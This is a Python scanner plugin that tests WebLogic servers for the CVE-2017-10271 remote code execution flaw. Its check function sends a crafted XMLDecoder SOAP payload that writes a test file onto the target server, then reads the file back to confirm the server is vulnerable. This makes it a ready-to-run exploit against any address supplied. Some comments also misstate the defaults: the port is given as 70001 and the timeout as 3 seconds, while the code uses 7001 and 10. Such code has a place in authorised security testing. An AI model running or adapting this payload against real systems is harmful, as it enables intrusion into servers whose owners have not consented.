# -*- coding:utf-8 -*-
#@Time : 2020/4/21 19:31
#@Author: Triomphe
#@File : weblogic_CVE_2017_10271.py

"""Version:10.3.6.0.0/12.1.3.0.0/12.2.1.1.0
        CVE-2017-10271

    return True 表示存在此漏洞.
"""

# coding:utf-8

import requests

def get_plugin_info():
    plugin_info = {
        "name": "WebLogic WLS RCE CVE-2017-10271",
        "info": "WebLogic WLS组件中存在CVE-2017-10271远程代码执行漏洞，可以构造请求对运行WebLogic中间件的主机进行攻击，近期发现此漏洞的利用方式为传播挖矿程序。",
        "level": "高危",
        "type": "命令执行",
        "keyword": "tag:weblogic",
        "source": 1,
    }
    return plugin_info

#端口默认70001,默认超时3秒
def check(ip,port=7001,timeout=10):
    url_suffix = ['/wls-wsat/CoordinatorPortType','/wls-wsat/CoordinatorPortType11']
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'text/xml;charset=UTF-8'
    }
    post_data = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                <java version="1.6.0" class="java.beans.XMLDecoder">
                    <object class="java.io.PrintWriter">
                        <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt</string><void method="println">
                        <string>exist_xmldecoder_vul_testing</string></void><void method="close"/>
                    </object>
                </java>
            </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
    </soapenv:Envelope>
    '''
    try:
        for url in url_suffix:
            post_url='http://'+ip+':'+str(port)+url.strip()
            res=requests.post(post_url,data=post_data,headers=headers,timeout=timeout)
            get_url='http://'+ip+':'+str(port)+"/wls-wsat/test.txt"
            check_result = requests.get(get_url,headers=headers,timeout=timeout)
            if 'exist_xmldecoder_vul_testing' in check_result.text:
                return post_url+" [+]存在WebLogic WLS远程执行漏洞(CVE-2017-10271)"
    except Exception as e:
        print("weblogci_CVE_2017)10271"+str(e))
        return
